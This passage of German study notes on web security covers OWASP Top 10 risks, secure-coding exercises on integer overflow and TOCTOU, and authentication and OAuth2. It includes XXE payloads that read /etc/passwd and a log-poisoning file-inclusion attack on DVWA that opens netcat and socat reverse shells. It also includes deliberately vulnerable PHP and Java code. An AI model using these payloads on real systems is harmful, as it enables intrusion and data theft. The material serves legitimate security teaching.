- Vor sensiblen Aktionen erneute Authentifizierung einsetzen
- `SameSite`-Attribut von `Set-Cookie`. Damit kann eingeschränkt werden, wann Cookies mitgesendet werden
- Filter und Maskierungsfunktionen in PHP e.g. `htmlspecialchars()`, `htmlentities()`

**DVWA-Beispiel**

**Code** 

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

**Exploit**

```
?password_new=password&password_conf=password&Change=Change
```

### A4: Unsicherer Entwurf

Der Entwurf berücksichtigt die Risiken für die zu entwickelnde Software nicht angemessen im Kontext des Geschäftsumfelds, der Anwendungsfalls, der Einsatzumgebung etc.

**Konsequenz**
- Notwendige Sicherheitsmaßnahmen sind nicht im Entwurf enthalten und werden dementsprechend auch nicht implementiert

**Anmerkungen**
- Sicherer Entwurf kann durch Fehler in der Implementierung trotzdem zu Schwachstellen führen 
- Ein unsicherer Entwurf lässt sich selbst durch eine perfekte Implementierung nicht reparieren

**Angriffsszenarien**

- **Schwachstelle** im Entwurf
  - Einrichten neuer Zugriffsdaten erfolgt über zuvor hinterlegte **Sicherheitsfragen**
- **Angriff**
  - **Social Engineering** zum Ausfragen der Person, um die Personen zu erfragen
- **Problem**
  - Derartige Fragen und Antworten sind kein vertrauenswürdiger Nachweis für die Identität einer Person
- **Anmerkung**
  - Solche Sicherheitsfragen sind durch Standards- und De-Facto-Standards auch verboten
- **Schwachtstelle** im Entwurf
  - Es wurde nicht an Schutz vor Bots gedacht, d.h. die Anzahl an Transaktionen in einem kurzen Zeitraum wurde nicht begrenzt
- **Angriff**
  - Bots kaufen und verkaufen für mehr (scalpers)
- **Konsequenzen**
  - Rufschädigung
  - Echte Käufer verärgert

#### Gegenmaßnahmen

- Anforderungen und Ressourcenverwaltung
  - Anforderungen einsammeln und besprechen
  - Einbeziehen von **Sicherheitsanforderungen**
  - Berücksichtigen, wie einfach die Anwendung zugreifbar ist
  - **Budget** für alle Phasen **einplanen**
- Sicherer Entwurf
  - **Permanente Evaluation**
  - Integrieren von **Bedrohungsmodellierung**
  - Fehlerzustände in User Stories festlegen
- Sicherer Software-Entwicklungszyklus
  - Bedrohungsmodullierung
  - Sichere Entwurfsmuster
  - **Bibliotheken mit sicheren Komponenten**
  - **Sicherheitsexperten** in allen Phasen eingebunden
  - Hilfestellung durch OWASP Software Assurance Maturity Model (SAMM)
- Implementierung
  - Plausibilitätsprüfungen einbauen
  - **Unit- und Integrationtests**
  - **Schichtentrennung**
  - Mandaten trennen
  - Begrenzung des Ressourcenverbauchs durch Benutzer und Dienste

### A5: Fehlerhafte Sicherheitskonfiguration

**Konfigurationseinstellungen** können zu Sicherheitslücken führen

- **Beispiele** 
	- **Unsauber definierte Berechtigungen** für Cloud-Services 
	- **Unnötige Funktionalität** installiert und/oder aktiviert (Ports/Dienste/Benutzerkonten etc.) 
	- **Standardbenutzerkonten** und Standardpasswörter 
	- Detailinformationen (e.g. **Stack Traces**) in Fehlermeldungen 
	- System **veraltet**
	- **Keine sichere Vorbelegung** 
	- **Directory Listing** aktiviert
- **Auswirkung** 
	- Unberechtigter Zugriff auf Daten und Funktionen, manchmal sogar das ganze System

#### Gegenmaßnahmen

- Implementierung von **sicheren Installationsprozessen**
  - Wiederholbar, automatisierbar
  - Verwendung einer minimalen Plattform
  - Regelmäßige Updates
  - Verwendung von SIcherheitsdirektiven wie Header-Fehler e.g. CSP, HSTS

#### XML External Entities (XXE)

- **Ablauf** 
	- XML-Dokument enthält Verweis (URI) auf eine externe Entität 
	- XML-Dokument wird auf eine Web-Seite hochgeladen 
	- Web-Seite verarbeitet das XML-Dokument durch einen verwundbaren XML-Prozessor 
	- Der XML-Prozessor löst den Verweis auf die externe Entität auf und wertet diese aus 
	- Dadurch wird der Schadcode ausgeführt
- **Auswirkungen** 
	- Auslesen von Daten 
	- Anfragen ausgehend vom übernommenen Server verschicken 
	- Interne Systeme "scannen" 
	- DoS
- **Angriff** 
	- Auslesen von Dateien aus dem Dateisystem des Servers:
	```xml
	<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>
	```
 	- Durchführen von Anfragen auf Server, auf die ein Angreifer sonst nicht direkt zugreifen kann. Dadurch lassen sich auf Firewalls umgehen oder die Quelle von Angriffen wie Port-Scans verschleiern
	```xml
	<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://server.com/path" >]> <foo>&xxe;</foo>
	```
- **Ursachen** 
	- Anwendunge akzeptiert direkt oder per Upload XML-Dokumente aus nicht vertrauenswürdigen Quellen 
	- Anwendung fügt nicht vertrauenswürdige Daten in XML-Dokumente ein 
	- SOAP vor 1.2
- **Gegenmaßnahmen**
	- Schwachstellen Scan durchführen 
	- Verwendung einfacher Datenformate e.g. JSON 
	- Serialisieren sensibler Daten vermeiden 
	- XML-Prozessoren Updaten 
	- SOAP aktualisieren 
	- Verarbeitung von externen XML-Entitäten ausschalten

### A6: Nicht aktuelle Komponenten mit Schwachstellen

Anwendung enthält **bekannte Schwachstellen**, für die es vielleicht sogar schon vorbereitete Angriffe (Exploits) gibt. Schwachstellen kommen häufig durch die Verwendung von Drittkomponenten wie Frameworks oder Bibliotheken in die Anwendung.

- **Beispiele** 
	- Version direkt oder indirekt verwendeter Komponenten sind nicht bekannt 
	- Komponenten **nicht aktuell** oder werden **nicht mehr gewartet**
	- **Kein regelmäßiger Schwachstellenscan** 
	- **Kompatibilität** von neuen Versionen wird **nicht getestet**
- **Auswirkungen** 
	- Gering bis komplette **Übernahme des Systems**
- **Angriffsszenarien** 
	- Komponenten laufen mit denselben Berechtigungen wie die Anwendung in denen sie verwendet werden. Verursacht durch e.g. Programmierfehler oder Backdoor 
	- Ermitteln von IoT-Komponenten mit bekannten Schwachstellen e.g. Heartbleed über eine Suchmaschine
- **Maßnahmen** 
	- **Entfernen** von **nicht verwendeten Abhängigkeiten** und unnötiger Funktionalität 
	- Regelmäßige **Inventarisierung** 
	- **OWASP Dependency Check** durch Maven-Plugin e.g. `mvn verify` oder `mvn org.owasp:dependency-check-maven:check` 
	- **Mitverfolgen** von sicherheitsrelevanten **Nachrichten** 
	- Komponenten nur aus **öffentlichen Quellen** und aus sicheren Verbindungen beziehen 
	- **Virtual Patching** von nicht mehr maintainten Komponenten

### A7: Fehlerhafte Identifizierung und Authentifizierung

**Fehler bei der Bestätigung der Identität** von Benutzern, der Authentisierung oder der Sitzungsverwaltung

- **Beispiele** 
	- Anwendung erlaubt brute-force Angriffe 
	- Anwendung verwendet **Standardpasswörter** oder schwache Passwörter 
	- **Schwache Methode zum wiederherstellen des Zugangs** nach Passwortverlust 
	- **Speichern** von Passwörtern **im Klartext** oder mit schwacher Hash-Funktion 
	- **Keine Mehrfaktorauthentifizierung**
	- Fehlerhafte Sitzungsverwaltung (Session-ID in URL, Reuse von Session-IDs)
- **Angriffsszenarien**
	- Credential Stuffing (Brute Force mit dictionary) 
	- Erraten schwacher Passwörter
- **Maßnahmen**
	- **Mehrfaktorauthentifizierung**
	- Anwendungen **nie** mit **Standardzugangsdaten** ausstatten 
	- **Neue** oder geänderte **Passwörter** auf ihre **Stärke überprüfen**. Auch prüfen, ob diese zu den 10.000 schlechtesten Passwörtern gehören 
	- Aktuelle **Standards berücksichtigen**
	- Härtung gegen Enumeration Attacks 
	- Fehlgeschlagene Anmeldungsversuche begrenzen

#### Fehlerhaftes Session-Management

- **Bedrohung**
	- Angreifer **übernimmt** die **Sitzung** eines authentifizierten Nutzers
Ursachen 
	- Zu einfache oder nicht verschlüsselte Passwörter 
	- Angreifer erhält Zugriff auf die Session ID - Keine Mehrfaktorauthentifizierung

- **Beispiele** 
	- `jsessionid` in URL e.g. `http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQ SNDLPSKHCJUN2JV?dest=Hawaii` 
	- Gültigkeitsdauer einer Sitzung zu lange
	- Defizite beim Session-Management 	
	- HTTP zustandslos 
	- Session vom Benutzer über mehrere Anfragen hinweg zu identifizieren 
	- Session-IDs als Authentisierungstokens 
	- Durchgängige verwendung von SSL 
	- Fehlende Cookie-Optionen (`http-only`, `secure`) oder fehlender `session-timeout` 
	- Session-IDs nicht ausreichend zufällig 
	- Schwache Passwörter
- **Schutz der Session ID** 
	- Session-ID nur per SSL übertragen 
	- Zugriff auf Session-ID durch Clientseitige Skripte unterbinden 
	- Timeout für automatischen Logout setzen 
	- Cookie als "Tracking Mode" für die `JSESSIONID` konfigurieren 
	- Alle `<http-method>`-Tags entfernen
- **Beispiel durch Maßnahmen in `web.xml`**
```xml
<session-config> 
	<cookie-config> 
		<secure>
			 true 
		</secure> 
		<http-only>
			 true 
		</http-only> 
	</cookie-config> 
	<session-timeout> 
		15 
	</session-timeout> 
	<tracking-mode> 
		COOKIE 
	</tracking-mode> 
</session-config>
```
- **Gegenmaßnahmen** 
	- Brute Force durch ausprobieren von Passwörtern durch CAPTCHAs verhindern 
	- Schlechte Logout-Funktionalität absichern, indem Session-Informationen vollständig gelöscht werden 
	- Keine Passwörter im Klartext speichern, sondern auf Hash-Funktionen mit Salt verlassen 
	- Bei jedem Zugriff auf eine Seite im Intranet muss geprüft werden, ob eine Authentisierung stattgefunden hat

### A8: Fehlerhafte Software und Datenintegrität

Treffen von **Annahmen** e.g. über Software-Updates, kritische Daten oder CI/CD Pipelines **ohne** deren **Gültigkeit zu überprüfen**

- **Beispiele** 
	- Anwendungen verwenden Bibliotheken aus nicht vertrauenswürdigen Quellen oder CDNs 
	- Durch unsichere CI/CD-Pipeline besteht Möglichkeit zum unberechtigten Zugriff 
	- Automatische Updates ohne Integritätsprüfung
- **Angriffsszenarien**
	- Update ohne Signatur 
	- Router oder andere Geräte prüfen oft nicht auf Signaturen und sind leichte Angriffsziele 
	- Solarwinds: Updates mit Schadcode 
	- Sichere Buildprozesse umgangen und Schadcode eingeschläust

#### Gegenmaßnahmen
- Verwenden digitaler **Signaturen**
- Sicherstellen, dass Dependencies aus **vertauenswürdigen Repositories** stammen
- Sicherstellen, dass Werkzeuge zur Überprüfung der Supply-Chain eingesetzt werden e.g. **OWASP Dependency Check**
- **Review Process** fÜr Code- und Konfigurationsänderungen
- **Saubere** Trennung, Konfiguration und Zugangssteuerung in der **CI/CD Pipeline**
- **Serialisierte Daten** nur **signiert** oder **verschlüsselt** übertragen

#### Unsichere Deserialisierung

Anwendunge enthäkt serialisierte Objekte/Datenstrukturen e.g. als XML-, JSON- oder Binär-Dokumente und baut daraus durch Desieralisierung entsprechen Objekte/Datenstrukturen wieder neu im eigenen Kontext auf

- Die **serialisierten Daten** können **manipuliert** sein, um gezielt Werte zu verändern oder Code auf dem Zielsystem auszuführen
- **Anfällig** sind e.g. 
	- Fern- und Interprozesskommunikation: RPC und IPC 
	- **Web Services** 
	- Message Broker 
	- Caching- / Persistenz-Komponenten 
	- HTTP **Cookies**, HTML Formulare, **Tokens** zur Authentifizierung über APIs
- **Auswirkungen** 
	- Komplette **Übernahme** des Zielsystems und eventuelle Ausbreitung
- **Angriffsszenarien** 
	- Eine PHP-Anwendung verwendet Objektserialisierung, um "Super-Cookie" zu speichern
  `a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}` 
	- Angreifer modifiziert das serialisierte Objekt, um sich selbst administrative Rechte zu geben
  `a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}`
	- Eine React-Anwendunge ruft verschiedene Spring-Boot Microservices auf
	- Durch Verwendung des funktionales Programmierparadigmas soll der Code der Anwendung unveränderbar sein (immutable)
	- Zur Realisierung wird der Anwendungszustand mit jeder Anfrage zwischen Client und Server serialisiert hin- und hergeschickt
      Angriff
	- Einem Angreifer fällt die Java-Object-Signatur "R00" auf
	- Der Angreifer verndet dann die "Java Serial Killer"-Erweiterung für Burp-Suite, um eigenen Code auf dem Server auszuführen

- **Gegenmaßnahmen**
	- **Keine serialisierten Objekte aus nicht vertrauenswürdigen Quellen** akzeptieren 
	- Nur Serialisierungsmedien verwenden, die ausschließlich **primitive Datentypen** erlauben 
	- **Signaturen**
	- **Typenprüfung**
	- Code zur Deserialisierung in **isolierter Umgebung** ausführen

### A9: Fehlerhaftes Logging und Monitoring

Angriffe und **Angriffsversuche** werden **nicht erkannt**, wenn nicht alle Aktionen protokolliert werden. Wenn Angreifer evtl. Zugriff auf Log-Einträge haben, ist das Entwurfsmuster "Fehlerhafte Berechtigungsprüfung" zu erkennen.

- **Beispiele** 
	- **Nicht protokollierte** erfolgreiche und fehlgeschlagene **Login-Versuche**
	- Nicht protokollierte Systemaktionen 
	- **Fehler**, Ausnahmen und Warnungen werden nicht oder **nicht ausreichend protokolliert**
	- Log-Dateien werden nicht automatisiert auf verdächtiges Verhalten überwacht 
	- Logs werden nur lokal gespeichert 
	- **Uhrzeiten sind nicht synchronisiert**
	- Es sind **keine** angemessenen **Schwellwerte** für das Auslösen von **Alarmen** festgelegt 
	- Es werden keine Alarme ausgelöst, wenn ein Pentest durchgeführt wird 
	- **Angriffe werden nicht in Echtzeit erkannt**
- **Angriffsszenarien**
	- Angreifer scannen eine Anwendung auf typische Passwörter und sehen nur fehlgeschlagene Logins 
	- **Brute Force** möglich 
	- Firma verwendet Sandbox zur Analyse von E-mail anhängen 
	- Schadsoftware wird in Anhang gepackt, erkannt, aber niemand kümmert sich darum

#### Gegenmaßnahmen

- Sicherstellen, dass alle Vorgänge mit relevanten Kontextinformationen protokolliert werden (Logins, Fehlerhafte Logins, Eingabevalidierungsfehler, Fehler, IP, Session, Benutzer, Zeitstempel)
- Lange genug speichern, um forensische Analyse durchführen zu können
- Verwendung von Monitoring (SIEM, XDR, Elasticsearch, Kibana)
- Verwendung eines standatisierten Log-Formats, damit diese einfach ausgewertet werden können
- Log-Dateien append-only
- Incident Response and Recovery Plan etablieren
- Verwendung von Frameworks zum Schutz von Anwendungen (OWASP AppSensor, ModSecurity)

### A10: Server-Side Request Forgery (SSRF)

Eine Anwendung lädt eine Resource (über das Netzwerk) anhand einer URL, die vom Benutzer angegeben wird, ohne diese URL zu überprüfen

- **Beispiel** 
	- Angreifer stellt einen Request zusammen und **zwingt die Anwendung diese Request an ein Ziel zuschicken**, welches so von der Anwendung nicht vorgesehen war
- **Probleme**
	- Funktioniert auch, wenn Schutzmechanismen vorhanden sind, wie e.g. 
		- Web Application Firewall 
		- VPN 
		- Network Access Control List (ACL) 
		- Das Laden von Inhalten über URLs ist gerade in modernen Web-Anwendungen ein grundlegender Mechanismus, siehe AJAX oder fetch-API
- **Angriffsszenarien**
	- **Scan der Ports** interner Server 
	- Wenn das Netzwerk nicht segmentiert ist, können Angreifer die **internen Systeme ermitteln** und auch herausfinden, ob Ports auf internen Servern offen oder geschlossen sind 
	- Port-Scan funktioniert dadurch, dass die Ergebnisse von Verbindungen zu internen Servern mittels SSRF ausgewertet werden 
	- Abhängig vom Ergebnis oder der Responsetime ergibt sich dann, ob Port offen oder geschlossen ist 
	- **Preisgabe von sensiblen Daten** 
	- Angreifer können auf lokale Dateien oder interne Dienste zugreifen, um sensible Informationen zu gewinnen. 
	- Zugriff auf Metadatenspeicher von Cloud-Diensten 
	- Viele Cloud-Anbieter haben einen Metadatenspeicher 
	- Angreifer können mittels SSRF die Metadaten auslesen und so sensible Informationen gewinnen 
	- Kompromittiere interner Dienste 
	- Angreifer können interne Dienste missbrauchen, um weitere Angriffe durchzuführen (Remote Code Execution, DoS)

#### Gegenmaßnahmen

- **Mehrstufige Verteidigung**
- Maßnahmen auf Netzwerkebene
  - **Netzwerksegmentierung**
  - **Deny by default**
- Maßnahmen auf Anwendungsebene
  - Bereinigen und **Validieren sämtlicher Eingabedaten**, die vom Client kommen
  - **Positivlisten**
  - Keine Antworten im Reinformat senden
  - HTTP-Umleitung ausschalten
- Zusätzliche Maßnahmen
  - **Keine anderen sicherheitsrelevanten Diente auf System installieren**, die direkt vom Internet aus zugänglich sind

#### File Inclusion

- **Anfälliger Code**

```php
<?php
    $file = $_GET['page']; //The page we wish to display
    $ext = substr($file, strrpos($file, '.') + 1); // get file extension
    if($ext != "php") { // allow only php files for inclusion
    unset($file);
    }
    include($file);
?>
```

- **Angriff**

```bash
nc 172.17.0.1 80 # Connect via netcat
<?php echo shell_exec($_GET['cmd']); ?> # Insert php into access.log
```

Dann lokal einen Listener starten:

Netcat:

```bash
nc -lnvp 4242 # Listener starten
```

Socat:

```bash
socat -dd TCP-LISTEN:4444 STDOUT
```

Im Browser, folgende URL verwenden:

Netcat:

```bash
localhost/vulnerabilities/fi/?cmd=nc%20-e%20/bin/sh%20172.17.0.1%204242&page=../../../../../../../../var/log/apache2/access.log
```

Socat:

```bash
localhost/vulnerabilities/fi/?cmd=socat%20TCP4:172.17.0.1:4444%20EXEC:/bin/bash&page=../../../../../../../../var/log/apache2/access.log
```

- **Gegenmaßnahmen**

- **Eingabevalidierung**
- Indirekter Zugriff mit Lookup-Tabelle, e.g. einfach einen Switch-case mit den möglichen Files

## Aufgabe 5: Sichere Programmierung (secure coding) (10 Punkte)

### Implementierung einer Datenstruktur in Java

Gegeben sei die **folgende Definition** einer Datenstruktur:

```java
List<String> data = new ArrayList<String>(MAX);
```

Dabei ist **MAX** folgendermaßen definiert:

```java
private static fional int MAX = 100;
```

Eine Methode mit der untenstehenden Signatur soll einen **Wert an einer bestimmten Position in der Datenstruktur `data` eintragen**
:

```java
void setElementToExtraPosition(int extra, String element);
```

Die Position soll **berechnet** werden aus der aktuellen **Position** (`current`) und dem als Methodenparameter angegebenen **Versatz** (`extra`). Sowohl `current`, als auch `extra` sollen vom Typ `int` sein.

**Falls** die neue **Einfügeposition** außerhalb des Wertebereichs der Indizes der Datenstruktur liegt, soll eine **Ausnahme** (`IllegalArgumentException`) **ausgelöst werden**.

Rufen Sie die Funktion `setElementToExtraPosition()` mit verschiedenen Werten auf.

Was geschieht, wenn Sie **folgende Werte** verwenden:

```java
current = 50
extra = Integer.MAX_VALUE:
```

Nehmen wir an, wir verwenden foldende Implementierung von `setElementToExtraPosition()`: 

```java
if (extra < 0 || current + extra > MAX) {
	throw new IllegalArgumentException();
}
data.set(current + extra, element);
```

Wenn wir nun `current = 50` und `extra = Integer.MAX_VALUE` setzen, stellen wir fest, dass dies in unserer Implementierung zu einer IndexOutOfBoundsException führt. Das liegt daran, dass das Problem erst Auftritt, wenn wir `current+extra` addieren. `current+extra` overflowt in den negativen Bereich. Das wird aber noch nicht geprüft. Da `current+extra` in den negativen Bereich overflowt, wird der check `current+extra > MAX` auch zu `false` evaluiert, was dazu führt, dass die `data.set()` Methode den negativen Wert von `current+extra` bekommt und daher die `IndexOutOfBoundsException()` wirft.

Was würde geschehen, wenn Sie ein Element auf Position `current = 50` eintragen und anschließend ein Element auf der folgenden Position eintragen:

```java
current + Integer.MIN_VALUE + Integer.MIN_VALUE 
```

Dies führt in der Implementierung zu keinem Fehler, da `current + Integer.MIN_VALUE + Integer.MIN_VALUE` darauf deutet, dass `extra = Integer.MIN_VALUE + Integer.MIN_VALUE`, was 0 ergibt. `current = 50` und `extra=0` ist in allen Implementierungen valide und führt daher zu keinem Problem. Das Problem liegt hier also nicht in der Methode, sondern schon bei der Variablendeklaration.

```java
import java.math.BigInteger;
import java.util.ArrayList;
import java.util.List;

public class IntegerOverflow {

	private static final int MAX = 100; // Integer.MAX_VALUE + 1

	private int current;
	private List<String> data;

	public IntegerOverflow() {
		current = 0;
		data = new ArrayList<String>(MAX);
		for (int i = 0; i < MAX; i++) {
			data.add(i,  "");
		}
	}

	public static void main(String[] args) {
		IntegerOverflow io = new IntegerOverflow();
		io.process();
	}

	private void process() {
		System.out.println("Liste im Initialzustand:");
		System.out.println(data.toString());

		current = 50; // Integer.MAX_VALUE

		data.set(current, "Alter Wert");
		System.out.println("\nListe nach Setzen eines Wertes auf Position current = " + current);
		System.out.println(data.toString());

		int extra = Integer.MAX_VALUE + Math.abs(Integer.MIN_VALUE) + 1;
//		int extra = Math.abs(Integer.MIN_VALUE) + 1;
//		int extra = Integer.MAX_VALUE;
//		System.out.println("\nBerechnung des extra-Index durch Integer.MAX_VALUE + Math.abs(Integer.MIN_VALUE) + 1 = " + extra);
		System.out.println("\nextra-Index: = " + extra);

		setElementToExtraPosition(extra, "Neuer falscher Wert");
		System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));
		System.out.println(data.toString());

//		setElementToExtraPositionMoreSecure(extra, "Neuer Wert More Secure");
//		System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));
//		System.out.println(data.toString());
//
//		setElementToExtraPositionSecure(extra, "Neuer Wert Secure");
//		System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));
//		System.out.println(data.toString());

	}

	private void setElementToExtraPosition(int extra, String element) {
//		System.out.println("current + extra = " + (current + extra));
		if (extra < 0 || current + extra > MAX - 1) {
			throw new IllegalArgumentException();
		}
		data.set(current + extra, element);
	}

	private void setElementToExtraPositionMoreSecure(int extra, String element) {
		if (extra < 0 || current > MAX - 1 - extra) {
			throw new IllegalArgumentException();
		}
		data.set(current + extra, element);
	}

	private void setElementToExtraPositionSecure(int extra, String element) {
		BigInteger currentBig = BigInteger.valueOf(current);
		BigInteger maxBig = BigInteger.valueOf(MAX - 1);
		BigInteger extraBig = BigInteger.valueOf(extra);
		if (extra < 0 || currentBig.add(extraBig).compareTo(maxBig) > 0) {
			throw new IllegalArgumentException();
		}
		data.set(current + extra, element);
	}
}
```

### Secure Coding

Implementieren Sie die mit **TODO** markierten stellen

Das Vorhandensein eines `AttackThreads` gibt Ihnen einen **Hinweis** worauf Sie in Ihren Implementierungen achten sollten.

Was müssen Sie noch in Ihrer Implementierung beachten?

Nach dem `validatePerson()` check in speicherePerson() schläft der Thread für 3 Sekunden, bevor die Person gespeichert wird. Innerhalb dieser 3 Sekunden ändert der Attacker nun die Felder der Person, welche nicht mehr validiert werden muss, da diese bereits als valide eingestuft wurde. Dies ist eine klassische `Time of Check vs. Time of Use` Schwachstelle. Man kann dafür sorgen, dass die Person dennoch richtig gespeichert wird, indem man eine Kopie des Objektes direkt bei Methodenaufruf erstellt und intern nur noch mit dieser Kopie arbeitet. Der Angreifer ändert nun zwar die Felder des person Objektes aus der `main`, aber da wir unsere, bereits validierte person verwenden, deren Felder der Angreifer nicht bearbeiten kann, speichern wir schlussendlich das Objekt mit den richtigen Feldern.

`Person.java`

```java
package toctou_solution;

public class Person {

	private String username;
	private String passwort;
	private Double gewicht;

	public Person(String username, String passwort, Double gewicht) {
		super();
		this.username = username;
		this.passwort = passwort;
		this.gewicht = gewicht;
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getPasswort() {
		return passwort;
	}

	public void setPasswort(String passwort) {
		this.passwort = passwort;
	}

	public Double getGewicht() {
		return gewicht;
	}

	public void setGewicht(Double gewicht) {
		this.gewicht = gewicht;
	}

	@Override
	public String toString() {
		return "Person [username=" + username + ", passwort=" + passwort + ", gewicht=" + gewicht + "]";
	}
}
```

`TOCTOU.java`

```java
package toctou_solution;

import java.util.logging.Logger;

import toctou.exception.PersonException;

public class TOCTOU {

	private static Logger logger = Logger.getLogger(TOCTOU.class.getName());

	class AttackThread extends Thread {

		private Person person;

		public AttackThread(Person p) {
			this.person = p;
		}

		@Override
		public void run() {
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			person.setPasswort("pwnd");
			person.setGewicht(1000.0d);
		}
	}

	private boolean validatePerson(Person p) {
        // TODO: Rufen Sie die entsprechenden Methoden der Klasse Validator auf.
		logger.info("Validiere Person : " + p);
		Validator v = Validator.getInstance();
		if (!v.checkValidString(p.getUsername())) {
			return false;
		}
		if (!v.checkValidPassword(p.getPasswort())) {
			return false;
		}
		if (!v.checkValidDouble(p.getGewicht())) {
			return false;
		}
		return true;
	}

	public void speicherePerson(Person p) throws PersonException {
     	// TODO: Validieren Sie das Argument p durch Aufruf der Methode validatePerson()
		// Remove the following line of code to demonstrate a successful attack.
		Person person = new Person(p.getUsername(), p.getPasswort(), p.getGewicht());
		if (!validatePerson(person)) {
			throw new PersonException("Person enthält ungültige Werte: " + person);
		}
		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		logger.info("Person " + person + " erfolgreich gespeichert.");
	}

	public static void main(String[] args) {
		TOCTOU t = new TOCTOU();
		Person person = new Person("sheldon", "abc123xyz!", 73.0);
		AttackThread at = t.new AttackThread(person);
		at.start();
		try {
			t.speicherePerson(person);
		} catch (PersonException e) {
			// person.setUsername("xxxxxxxxxxxxx");
			// person.setUsername(null);
			// person.setPasswort("xxxxxxxxxxxxx");
			// person.setPasswort(null);
			// person.setGewicht(0.0);
			// person = null;
			logger.warning(e.getMessage());
		}

		try {
			at.join();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		System.out.println("Inhalt von Person am Ende des Programms: " + person);
	}
}
```

`Validator.java`

```java
package toctou_solution;

public class Validator {
	private static Validator validator = new Validator();

	public static Validator getInstance() {
		return validator;
	}

	public boolean checkValidString(String s) {
        // TODO: Implementieren Sie die Prüfung von Zeichenketten so, dass
		//       1. null-Strings und leere Zeichenketten NICHT erlaubt sind
		//       2. nur Klein- und Großbuchstaben erlaubt sind.
		//       Zeichenketten dürfen eine beliebige Länge haben.
		if (s == null) {
			return false;
		}
		String pattern = "[a-zA-Z]+";
		return s.matches(pattern);
	}

	public boolean checkValidPassword(String s) {
        // TODO: Implementieren Sie die Prüfung von Passwörtern so, dass
		//       1. null-Strings und leere Zeichenketten NICHT erlaubt sind
		//       2. ein Passwort mindestens 10 Zeichen haben muss.
		if (s == null || s.trim().isEmpty()) {
			return false;
		}
		if (s.length() < 10) {
			return false;
		}
		return true;
	}

	public boolean checkValidDouble(Double d) {
        // TODO: Implementieren Sie die Prüfung von Gewichtsangaben so, dass das Gewicht zwischen 0.0 und 300.0 Kg liegen muss.
		if (d == null) {
			return false;
		}
		if (d < 0.0d || d > 300.0d) {
			return false;
		}
		return true;
	}
}
```

## Aufgabe 6: Authentisierung/Authentifizierung (3+2 = 5 Punkte)

### Grundlagen

**Authentisierung**

- **Nachweis einer Eigenschaft** / Bezeugung der Echtheit
- i.d.R.
  - **Sicherstellung der Identität**
  - Nachweis einer Person, dass sie tatsächlich diejenige Person ist, die sie vorgibt zu sein
  - Person legt also Nachweise vor, die ihre Identität bestätigen sollen
  - Beantwortung der Frage "Wer bin ich?"

**Authentifizierung**

- **Prüfung der behaupteten Authentisierung** / Vorgang der Echtheitsprüfung
- Verifizieren der behaupteten Eigenschaft durch Überprüfen der vorgelegten Nachweise
- Authentifizierung gilt solange, bis der betreffende Kontext bzw. betreffende Modus verlassen oder verändert wird

![AuthN](./static/authN.png)

**Autorisierung**

- **Einräumen von speziellen Rechten** für authentifizierte Personen / Systeme
- Zuweisung von Rechten in Abhängigkeit der jeweiligen Identität
- Rolle `r` hat Berechtigung `b`

**Authentisierungsmethoden**

- **Wissen**: Passwort, PIN
- **Besitz**: Token, Zertifikat
- **Eigenschaften**: Biometrische Daten

**Starke Authentisierung**

- keine statischen Passwörter
- keine schwachen Passwörter
- Mehrfaktor Authentifizierung
  - Kombinationen von Wissen, Besitz und Eigenschaften
- Nicht abhörbar (e.g. Einmalpasswörter)

### OAuth2

**Definition**

- Sammlung von Spezifikationen für den Tokenbasierten Zugriff auf Ressourcen über HTTP

**Rollen**

![Rollen](./static/rollen.png)

**Standardprotokoll**

![Standardprotokoll](./static/standardprotokoll.png)

![Kategorien](./static/category.png)

**Authorization Code Grant + PKCE Flow**

- Eintauschen eines Autorisierungs-Codes (authorization code) gegen eine Zugriffsberechtigung (access token)
- Authorization Code -> Access Token

- **Vorgehen**
	- Client bekommt Autorisierungs-Code (authorization code) vom Authorization Server, nachdem der Endnutzer (resource owner) dies erlaubt hat, z.B. durch ein Login mit Benutzername und Passwort auf dem Authorization Server
	- Zuvor muss Client beim Authorization Server registriert sein, damit Authorization Codes nur an vertrauenswürdige Clients herausgegeben werden, also nicht an Clients, die ein Angreifer kontrolliert
